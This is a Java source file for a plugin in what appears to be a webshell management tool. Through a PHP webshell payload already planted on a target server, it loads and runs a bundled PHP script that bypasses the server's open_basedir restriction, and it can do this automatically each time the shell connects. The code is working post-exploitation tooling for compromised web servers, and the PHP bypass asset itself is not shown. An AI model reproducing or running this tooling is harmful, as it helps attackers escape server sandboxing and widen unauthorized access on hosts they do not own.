package shells.plugins.php;

import core.Db;
import core.Encoding;
import core.annotation.PluginAnnotation;
import core.imp.Payload;
import core.imp.Plugin;
import core.shell.ShellEntity;
import core.ui.component.dialog.GOptionPane;
import java.awt.Component;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.io.InputStream;
import javax.swing.JButton;
import javax.swing.JCheckBox;
import javax.swing.JPanel;
import util.Log;
import util.automaticBindClick;
import util.functions;
import util.http.ReqParameter;

@PluginAnnotation(
   payloadName = "PhpDynamicPayload",
   Name = "ByPassOpenBasedir",
   DisplayName = "ByPassOpenBasedir"
)
public class ByPassOpenBasedir implements Plugin {
   private static final String CLASS_NAME = "plugin.ByPassOpenBasedir";
   private static final String APP_ENV_KEY = "AutoExecByPassOpenBasedir";
   private final JPanel panel = new JPanel();
   private final JCheckBox autoExec = new JCheckBox("autoExec");
   private final JButton bybassButton = new JButton("ByPassOpenBasedir");
   private boolean loadState;
   private ShellEntity shell;
   private Payload payload;
   private Encoding encoding;

   public ByPassOpenBasedir() {
      boolean autoExecBoolean = false;
      if ("true".equals(Db.getSetingValue("AutoExecByPassOpenBasedir"))) {
         autoExecBoolean = true;
      }

      this.autoExec.setSelected(autoExecBoolean);
      this.autoExec.addActionListener(new ActionListener() {
         public void actionPerformed(ActionEvent paramActionEvent) {
            boolean autoExecBoolean = ByPassOpenBasedir.this.autoExec.isSelected();
            Db.updateSetingKV("AutoExecByPassOpenBasedir", Boolean.toString(autoExecBoolean));
         }
      });
      this.panel.add(this.bybassButton);
      this.panel.add(this.autoExec);
      automaticBindClick.bindJButtonClick(this, this);
   }

   public JPanel getView() {
      return this.panel;
   }

   private void load() {
      if (!this.loadState) {
         try {
            InputStream inputStream = this.getClass().getResourceAsStream("assets/ByPassOpenBasedir.php");
            byte[] data = functions.readInputStream(inputStream);
            inputStream.close();
            if (this.payload.include("plugin.ByPassOpenBasedir", data)) {
               this.loadState = true;
               Log.log("Load success");
            } else {
               Log.log("Load fail");
            }
         } catch (Exception var3) {
            Log.error((Throwable)var3);
         }
      }

   }

   private void bybassButtonClick(ActionEvent actionEvent) {
      if (!this.loadState) {
         this.load();
      }

      if (this.loadState) {
         byte[] result = this.payload.evalFunc("plugin.ByPassOpenBasedir", "run", new ReqParameter());
         String resultString = this.encoding.Decoding(result);
         Log.log(resultString);
         GOptionPane.showMessageDialog((Component)null, resultString, "提示", 1);
      } else {
         Log.error("load ByPassOpenBasedir fail!");
      }

   }

   public void init(ShellEntity arg0) {
      this.shell = arg0;
      this.payload = arg0.getPayloadModule();
      this.encoding = Encoding.getEncoding(arg0);
      if (this.autoExec.isSelected()) {
         this.bybassButtonClick((ActionEvent)null);
      }

   }
}
